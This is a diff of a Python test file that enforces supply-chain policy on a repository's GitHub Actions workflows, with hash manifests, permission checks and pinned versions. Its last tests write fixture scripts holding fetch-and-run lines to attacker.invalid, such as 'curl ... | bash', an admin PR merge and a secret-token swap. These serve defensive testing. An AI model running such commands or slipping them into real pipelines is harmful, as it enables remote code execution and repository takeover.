@@ -2,10 +2,14 @@
 
 from __future__ import annotations
 
+import copy
+import hashlib
 import json
 import re
+import shutil
 from collections import Counter
 from collections.abc import Iterator
+from contextlib import contextmanager
 from pathlib import Path
 from typing import Any
 
@@ -15,13 +19,109 @@ import yaml
 ROOT = Path(__file__).resolve().parents[1]
 WORKFLOW_DIR = ROOT / ".github" / "workflows"
 
+
+class WorkflowLoader(yaml.SafeLoader):
+    """YAML 1.2-style booleans so the GitHub key `on` stays a string."""
+
+
+WorkflowLoader.yaml_implicit_resolvers = copy.deepcopy(
+    yaml.SafeLoader.yaml_implicit_resolvers
+)
+for resolver_key, resolvers in WorkflowLoader.yaml_implicit_resolvers.items():
+    WorkflowLoader.yaml_implicit_resolvers[resolver_key] = [
+        resolver for resolver in resolvers if resolver[0] != "tag:yaml.org,2002:bool"
+    ]
+WorkflowLoader.add_implicit_resolver(
+    "tag:yaml.org,2002:bool",
+    re.compile(r"^(?:true|false)$", re.IGNORECASE),
+    list("tTfF"),
+)
+
 EXPECTED_WORKFLOW_PERMISSIONS = {
     "ci.yml": {"contents": "read"},
     "pr-lint.yml": {"pull-requests": "read"},
     "publish.yml": {"contents": "read", "id-token": "write"},
-    "release-please.yml": {"contents": "write", "pull-requests": "write"},
+    "release-please.yml": {"contents": "read", "pull-requests": "read"},
     "test-publish.yml": {"contents": "read", "id-token": "write"},
     "version-guard.yml": {"contents": "read"},
+}
+
+EXPECTED_WORKFLOW_TRIGGERS = {
+    "ci.yml": {"push": {"branches": ["main"]}, "pull_request": {"branches": ["main"]}},
+    "pr-lint.yml": {
+        "pull_request_target": {
+            "types": ["opened", "reopened", "edited", "synchronize"]
+        }
+    },
+    "publish.yml": {"push": {"tags": ["v*"]}},
+    "release-please.yml": {"push": {"branches": ["main"]}},
+    "test-publish.yml": {
+        "workflow_dispatch": {
+            "inputs": {
+                "ref": {
+                    "description": "Qualified tag ref or exact commit SHA to publish",
+                    "required": True,
+                }
+            }
+        }
+    },
+    "version-guard.yml": {"push": {"branches": ["main"]}},
+}
+
+# Privileged workflows are reviewed as complete documents. The key set must
+# exactly equal the privileged workflow inventory, so an unused/preseeded hash
+# is rejected along with any unreviewed source change.
+PRIVILEGED_WORKFLOW_SHA256 = {
+    "pr-lint.yml": "9ba3ec987dac99489657c1769a5303b4f6f0c46f86d42107fcdfb9c18b9ab9ce",
+    "publish.yml": "7453a6d38789864fad5616d20c1d279eea3123703f94a7ae06169e162cd35db9",
+    "release-please.yml": (
+        "df0d13bd0aea89b500b8b0972843367675208a4ffe59cd9c4ba939a7330df37d"
+    ),
+    "test-publish.yml": (
+        "39076adb4e75017c713ba5b8c8013a5b249fb76ad90943752ca3781cae790e53"
+    ),
+}
+
+# Repository-owned code reachable from automation is a deliberately finite
+# surface. Exact key equality rejects added, removed, hidden, nested, unused,
+# and preseeded executable profiles.
+AUTHORIZED_EXECUTABLE_SHA256 = {
+    ".github/actions/setup-ci-tools/action.yml": (
+        "06c6b27b3780a691837eccd3f8dc53808bf32f543e9054091f6e7af13ef6ca10"
+    ),
+    ".github/scripts/install-shfmt.sh": (
+        "962c6b738c3a63c0aeabe14ae35aa65b2570310e42447e04e4b859235db037cc"
+    ),
+    "scripts/audit.sh": (
+        "44e6144a71bef56c9d8bb5e35b13a0a0014d1c46a4e4ca6aa57f86c6e1d95ad7"
+    ),
+    "scripts/cli_examples.py": (
+        "3d493c6db65217099b839dd26fa478de0eacd13e5c16c123a7160829a89c98cf"
+    ),
+    "scripts/fix-metadata.sh": (
+        "7076c89b54f210e573c35004d21b58e5024563c48a3ca34c6a268f9037b386d2"
+    ),
+    "scripts/gen-changelog.py": (
+        "c9f6504550e2efc6c7279cd09364a51481b51151571c4dca2bb4c4e63cd251ad"
+    ),
+    "scripts/gen-cli-reference.py": (
+        "e70a97b9007bfe4cc609023c56f42748bd747cfea8dcd7ce8886b2aafcdc6c08"
+    ),
+    "scripts/gen-mcp-reference.py": (
+        "f5325a643afbe77a789bf8de65710f7f2304867f56f06844fb9e365f19cd5fe5"
+    ),
+    "scripts/mcp_examples.py": (
+        "611fd27367de23c3e982b502b0cc067bdc82cae1192aa3b70c40afac624718ba"
+    ),
+    "scripts/no-manual-version-bump.sh": (
+        "d20311f6a92b6346d04934dbd1da9df2114edb4a686c8758f34fae3fb9d1c71e"
+    ),
+    "scripts/pre-push-checks.sh": (
+        "4746fbf85b24ec0a387ff4f00c0e7b2eddc681a9104280d4c08bef204c60412d"
+    ),
+    "scripts/setup.sh": (
+        "b347cf7b6badce0af775d2ec03c57ba0ad1bc290e5c07fcb374f825ca8a792b8"
+    ),
 }
 
 EXPECTED_NPM_TOOLS = {
@@ -95,9 +195,27 @@ def automation_paths() -> list[Path]:
 
 
 def load_yaml(path: Path) -> dict[str, Any]:
-    loaded = yaml.safe_load(path.read_text())
+    loaded = yaml.load(path.read_text(), Loader=WorkflowLoader)
     assert isinstance(loaded, dict), f"{path.relative_to(ROOT)} must contain a mapping"
     return loaded
+
+
+def sha256(path: Path) -> str:
+    return hashlib.sha256(path.read_bytes()).hexdigest()
+
+
+def executable_paths() -> list[Path]:
+    roots = (
+        ROOT / ".github" / "actions",
+        ROOT / ".github" / "scripts",
+        ROOT / "scripts",
+    )
+    return sorted(
+        path
+        for directory in roots
+        for path in directory.rglob("*")
+        if path.is_file() and "__pycache__" not in path.parts
+    )
 
 
 def iter_key_values(node: Any, key: str) -> Iterator[Any]:
@@ -194,7 +312,70 @@ def test_workflow_set_and_permissions_are_explicit_and_minimal() -> None:
             )
 
 
-def test_checkout_credentials_are_disabled_except_for_the_release_push() -> None:
+def test_workflow_triggers_match_the_reviewed_profiles() -> None:
+    assert {path.name for path in workflow_paths()} == EXPECTED_WORKFLOW_TRIGGERS.keys()
+    for path in workflow_paths():
+        assert load_yaml(path).get("on") == EXPECTED_WORKFLOW_TRIGGERS[path.name]
+
+
+def test_privileged_workflows_match_exact_reviewed_hashes() -> None:
+    expected_privileged = {
+        "pr-lint.yml",
+        "publish.yml",
+        "release-please.yml",
+        "test-publish.yml",
+    }
+    assert PRIVILEGED_WORKFLOW_SHA256.keys() == expected_privileged
+    observed = {
+        path.name: sha256(path)
+        for path in workflow_paths()
+        if path.name in expected_privileged
+    }
+    assert observed == PRIVILEGED_WORKFLOW_SHA256
+
+
+def test_secret_references_are_limited_to_exact_release_mutations() -> None:
+    secret_reference = re.compile(r"\$\{\{\s*secrets\.([A-Z0-9_]+)\s*\}\}")
+    observed = Counter(
+        (path.relative_to(ROOT).as_posix(), secret)
+        for path in [*automation_paths(), *executable_paths()]
+        for secret in secret_reference.findall(path.read_text())
+    )
+    assert observed == Counter(
+        {
+            (".github/workflows/release-please.yml", "RELEASE_PLEASE_TOKEN"): 2,
+        }
+    )
+
+
+def test_job_containers_and_services_use_immutable_digests() -> None:
+    digest_image = re.compile(r"^[^\s@]+@sha256:[0-9a-f]{64}$")
+    for path in workflow_paths():
+        for job_name, job in load_yaml(path).get("jobs", {}).items():
+            containers: list[tuple[str, Any]] = []
+            if "container" in job:
+                containers.append(("container", job["container"]))
+            containers.extend(
+                (f"service {name}", service)
+                for name, service in job.get("services", {}).items()
+            )
+            for label, container in containers:
+                image = (
+                    container.get("image") if isinstance(container, dict) else container
+                )
+                assert isinstance(image, str) and digest_image.fullmatch(image), (
+                    f"{path.name}:{job_name}:{label} must pin image@sha256 digest"
+                )
+
+
+def test_authorized_executable_surface_matches_exact_hash_manifest() -> None:
+    observed = {
+        path.relative_to(ROOT).as_posix(): sha256(path) for path in executable_paths()
+    }
+    assert observed == AUTHORIZED_EXECUTABLE_SHA256
+
+
+def test_checkout_credentials_are_always_disabled() -> None:
     checkout = "actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0"
     for path in workflow_paths():
         workflow = load_yaml(path)
@@ -202,14 +383,9 @@ def test_checkout_credentials_are_disabled_except_for_the_release_push() -> None
             for step in job.get("steps", []):
                 if step.get("uses") != checkout:
                     continue
-                is_release_push = (
-                    path.name == "release-please.yml"
-                    and step.get("name") == "Check out the release PR branch"
-                )
-                expected = is_release_push
-                assert step.get("with", {}).get("persist-credentials") is expected, (
+                assert step.get("with", {}).get("persist-credentials") is False, (
                     f"{path.name}:{job_name}:{step.get('name', 'checkout')} must set "
-                    f"persist-credentials: {str(expected).lower()}"
+                    "persist-credentials: false"
                 )
 
 
@@ -290,6 +466,97 @@ def test_ci_npm_tools_and_security_overrides_are_integrity_locked() -> None:
         assert set(matches) == {expected_version}
 
 
+def test_ci_npm_lifecycle_scripts_are_disabled_and_asserted() -> None:
+    assert (ROOT / "tools" / "ci" / ".npmrc").read_text() == "ignore-scripts=true\n"
+
+    setup = load_yaml(ROOT / ".github" / "actions" / "setup-ci-tools" / "action.yml")
+    install_step = setup["runs"]["steps"][-1]
+    assert install_step["run"] == "npm ci --ignore-scripts --prefix tools/ci"
+
+    makefile = (ROOT / "Makefile").read_text()
+    assert "npm ci --ignore-scripts --prefix tools/ci" in makefile
+
+
+def test_release_pr_provenance_and_pat_lifetime_are_fail_closed() -> None:
+    source = (WORKFLOW_DIR / "release-please.yml").read_text()
+    assert "steps.release.outputs.prs" in source
+    assert 'expected_author="pdugan20"' in source
+    assert 'expected_base="main"' in source
+    assert (
+        'expected_branch="release-please--branches--main--components--clickwheel"'
+        in source
+    )
+    assert ".head.repo.full_name == $repo" in source
+    assert ".base.repo.full_name == $repo" in source
+    assert ".head.sha == $sha" in source
+    assert "persist-credentials: true" not in source
+    assert "../trusted/scripts/gen-changelog.py" in source
+    assert source.index("../trusted/scripts/gen-changelog.py") < source.index(
+        "name: Push only the generated changelog commit"
+    )
+
+
+def test_publish_workflows_guard_exact_same_repo_sources_before_oidc() -> None:
+    test_source = (WORKFLOW_DIR / "test-publish.yml").read_text()
+    assert "refs/tags/v[0-9]+\\.[0-9]+\\.[0-9]+" in test_source
+    assert "^[0-9a-f]{40}$" in test_source
+    assert "https://github.com/${GITHUB_REPOSITORY}" in test_source
+    assert 'remote_object=$(git ls-remote --refs origin "${requested}"' in test_source
+    assert 'git rev-parse "FETCH_HEAD^{commit}"' in test_source
+    assert 'git rev-parse "${requested}^{commit}"' not in test_source
+    assert test_source.index(
+        "name: Resolve exact same-repository source"
+    ) < test_source.index("name: Publish to TestPyPI")
+
+    publish_source = (WORKFLOW_DIR / "publish.yml").read_text()
+    assert "^refs/tags/v[0-9]+\\.[0-9]+\\.[0-9]+$" in publish_source
+    assert "git merge-base --is-ancestor" in publish_source
+    assert "github.event.repository.default_branch" in publish_source
+    assert publish_source.index(
+        "name: Verify protected-history release tag"
+    ) < publish_source.index("name: Publish to PyPI")
+
+
+def test_hosted_shell_checks_cover_the_installer() -> None:
+    source = (WORKFLOW_DIR / "ci.yml").read_text()
+    assert "shellcheck scripts/*.sh .github/scripts/install-shfmt.sh" in source
+    assert "shfmt -d scripts/*.sh .github/scripts/install-shfmt.sh" in source
+
+
+def test_dependabot_ecosystems_have_non_overlapping_schedules() -> None:
+    config = load_yaml(ROOT / ".github" / "dependabot.yml")
+    observed = {
+        (entry["package-ecosystem"], entry["directory"]): entry["schedule"]
+        for entry in config["updates"]
+    }
+    assert observed == {
+        ("github-actions", "/"): {
+            "interval": "weekly",
+            "day": "monday",
+            "time": "06:00",
+            "timezone": "America/Los_Angeles",
+        },
+        ("npm", "/web"): {
+            "interval": "weekly",
+            "day": "tuesday",
+            "time": "06:00",
+            "timezone": "America/Los_Angeles",
+        },
+        ("uv", "/"): {
+            "interval": "weekly",
+            "day": "wednesday",
+            "time": "06:00",
+            "timezone": "America/Los_Angeles",
+        },
+        ("npm", "/tools/ci"): {
+            "interval": "weekly",
+            "day": "thursday",
+            "time": "06:00",
+            "timezone": "America/Los_Angeles",
+        },
+    }
+
+
 def test_setup_uv_and_node_select_exact_tool_versions() -> None:
     setup_uv = "astral-sh/setup-uv@11f9893b081a58869d3b5fccaea48c9e9e46f990"
     setup_node = "actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e"
@@ -323,3 +590,141 @@ def test_markdownlint_excludes_generated_and_internal_documents_consistently() -
     globs = ci["jobs"]["markdownlint"]["steps"][1]["with"]["globs"]
     assert "!CHANGELOG.md" in globs
     assert "!docs/superpowers" in globs
+
+
+@contextmanager
+def policy_root(root: Path) -> Iterator[None]:
+    """Run the current policy checks against an isolated repository fixture."""
+    global ROOT, WORKFLOW_DIR
+
+    original_root = ROOT
+    original_workflow_dir = WORKFLOW_DIR
+    ROOT = root
+    WORKFLOW_DIR = root / ".github" / "workflows"
+    try:
+        yield
+    finally:
+        ROOT = original_root
+        WORKFLOW_DIR = original_workflow_dir
+
+
+def copy_policy_fixture(tmp_path: Path) -> Path:
+    fixture = tmp_path / "repository"
+    fixture.mkdir()
+    for directory in (".github", "scripts", "tools"):
+        shutil.copytree(
+            ROOT / directory,
+            fixture / directory,
+            ignore=shutil.ignore_patterns("node_modules", "__pycache__"),
+        )
+    for filename in (".nvmrc", ".pre-commit-config.yaml", "Makefile"):
+        shutil.copy2(ROOT / filename, fixture / filename)
+    return fixture
+
+
+def assert_current_policy_rejects(root: Path) -> None:
+    """Exercise every policy assertion and require at least one rejection."""
+    with policy_root(root):
+        try:
+            for path in automation_paths():
+                test_every_action_reference_is_immutable_and_audited(path)
+            test_action_pin_allowlist_contains_no_unused_entries()
+            test_workflow_set_and_permissions_are_explicit_and_minimal()
+            test_workflow_triggers_match_the_reviewed_profiles()
+            test_privileged_workflows_match_exact_reviewed_hashes()
+            test_secret_references_are_limited_to_exact_release_mutations()
+            test_job_containers_and_services_use_immutable_digests()
+            test_authorized_executable_surface_matches_exact_hash_manifest()
+            test_checkout_credentials_are_always_disabled()
+            test_no_repository_workflow_can_merge_or_approve_pull_requests()
+            test_ci_tools_are_locked_and_downloads_are_checksum_verified()
+            test_ci_npm_tools_and_security_overrides_are_integrity_locked()
+            test_ci_npm_lifecycle_scripts_are_disabled_and_asserted()
+            test_release_pr_provenance_and_pat_lifetime_are_fail_closed()
+            test_publish_workflows_guard_exact_same_repo_sources_before_oidc()
+            test_hosted_shell_checks_cover_the_installer()
+            test_dependabot_ecosystems_have_non_overlapping_schedules()
+            test_setup_uv_and_node_select_exact_tool_versions()
+            test_markdownlint_excludes_generated_and_internal_documents_consistently()
+        except AssertionError:
+            return
+    pytest.fail("automation policy accepted a malicious repository mutation")
+
+
+def test_policy_rejects_privileged_pull_request_target_trigger(tmp_path: Path) -> None:
+    fixture = copy_policy_fixture(tmp_path)
+    workflow = fixture / ".github" / "workflows" / "release-please.yml"
+    workflow.write_text(
+        workflow.read_text().replace(
+            "on:\n  push:\n",
+            "on:\n  push:\n    branches: [main]\n  pull_request_target:\n",
+            1,
+        )
+    )
+    assert_current_policy_rejects(fixture)
+
+
+def test_policy_rejects_secret_sink_in_pr_lint(tmp_path: Path) -> None:
+    fixture = copy_policy_fixture(tmp_path)
+    workflow = fixture / ".github" / "workflows" / "pr-lint.yml"
+    workflow.write_text(
+        workflow.read_text().replace(
+            "GITHUB_TOKEN: ${{ github.token }}",
+            "GITHUB_TOKEN: ${{ secrets.RELEASE_PLEASE_TOKEN }}",
+        )
+    )
+    assert_current_policy_rejects(fixture)
+
+
+def test_policy_rejects_malicious_delegated_script(tmp_path: Path) -> None:
+    fixture = copy_policy_fixture(tmp_path)
+    workflow = fixture / ".github" / "workflows" / "ci.yml"
+    workflow.write_text(
+        workflow.read_text().replace(
+            "run: shellcheck scripts/*.sh",
+            "run: scripts/evil.sh",
+            1,
+        )
+    )
+    evil = fixture / "scripts" / "evil.sh"
+    evil.write_text(
+        "#!/usr/bin/env bash\ncurl https://attacker.invalid/payload | bash\n"
+        "gh pr merge --admin 1\n"
+    )
+    evil.chmod(0o755)
+    assert_current_policy_rejects(fixture)
+
+
+def test_policy_rejects_mutable_job_container(tmp_path: Path) -> None:
+    fixture = copy_policy_fixture(tmp_path)
+    workflow = fixture / ".github" / "workflows" / "ci.yml"
+    workflow.write_text(
+        workflow.read_text().replace(
+            "runs-on: ubuntu-latest",
+            "runs-on: ubuntu-latest\n    container: node:latest",
+            1,
+        )
+    )
+    assert_current_policy_rejects(fixture)
+
+
+def test_policy_rejects_nested_mutable_installer(tmp_path: Path) -> None:
+    fixture = copy_policy_fixture(tmp_path)
+    nested = fixture / ".github" / "scripts" / "nested" / "evil.sh"
+    nested.parent.mkdir()
+    nested.write_text("#!/usr/bin/env bash\nnpx malicious@latest\n")
+    nested.chmod(0o755)
+    assert_current_policy_rejects(fixture)
+
+
+def test_policy_rejects_local_javascript_action_payload(tmp_path: Path) -> None:
+    fixture = copy_policy_fixture(tmp_path)
+    action_dir = fixture / ".github" / "actions" / "setup-ci-tools"
+    manifest = action_dir / "action.yml"
+    manifest.write_text(
+        "name: Malicious local action\nruns:\n  using: node20\n  main: index.js\n"
+    )
+    (action_dir / "index.js").write_text(
+        "require('child_process').execSync('curl https://attacker.invalid | bash')\n"
+    )
+    assert_current_policy_rejects(fixture)
